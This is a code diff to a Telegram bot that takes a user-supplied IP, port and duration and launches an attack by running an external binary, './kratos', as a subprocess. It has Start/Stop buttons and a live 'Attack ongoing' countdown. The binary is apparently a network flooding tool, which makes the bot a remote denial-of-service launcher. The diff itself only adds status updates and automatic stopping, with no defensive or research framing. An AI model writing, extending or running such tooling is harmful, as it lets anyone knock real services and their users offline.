@@ -18,7 +18,7 @@ async def handle_ip_port(event):
     await event.respond(
         f"Received IP: {ip}, Port: {port}, Duration: {duration}\nChoose an action:",
         buttons=[
-            [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}" )]
+            [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
         ]
     )
 
@@ -34,6 +34,8 @@ async def handle_buttons(event):
 
         duration = int(duration.decode()) if duration else 60
         await event.answer("Starting the attack...", alert=True)
+        
+        # Start the attack and handle message update
         process = await run_attack(chat_id, ip.decode(), port.decode(), duration)
         running_processes[(chat_id, ip, port)] = process
 
@@ -42,23 +44,41 @@ async def handle_buttons(event):
         if process:
             process.terminate()
             await event.answer("Attack stopped successfully!", alert=True)
+            await event.edit(f"IP: {ip.decode()}:{port.decode()}\nStatus: Attack stopped")
         else:
             await event.answer("No running attack to stop!", alert=True)
 
 async def run_attack(chat_id, ip, port, duration):
     try:
+        # Start the attack process
         process = await asyncio.create_subprocess_shell(
             f"./kratos {ip} {port} {duration} 750",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
 
-        # Monitor process in the background
-        asyncio.create_task(monitor_process(chat_id, process))
+        # Use a single function to update the message
+        await update_attack_status(chat_id, ip, port, duration, process)
         return process
     except Exception as e:
         await client.send_message(chat_id, f"Failed to start attack: {e}")
         return None
+
+async def update_attack_status(chat_id, ip, port, duration, process):
+    # Start updating the message immediately
+    message = await client.send_message(chat_id, f"IP: {ip}:{port}\nStatus: Attack ongoing\nTime: {duration}s")
+    
+    # Perform the countdown
+    for remaining_time in range(duration, 0, -1):
+        await asyncio.sleep(1)
+        await message.edit(
+            f"IP: {ip}:{port}\nStatus: Attack ongoing\nTime: {remaining_time}s"
+        )
+
+    # After countdown, stop the attack
+    process.terminate()
+    await message.edit(f"IP: {ip}:{port}\nStatus: Attack stopped")
+    del running_processes[(chat_id, ip, port)]
 
 async def monitor_process(chat_id, process):
     try:
@@ -72,5 +92,3 @@ async def monitor_process(chat_id, process):
 
 if __name__ == "__main__":
     client.run_until_disconnected()
-
-
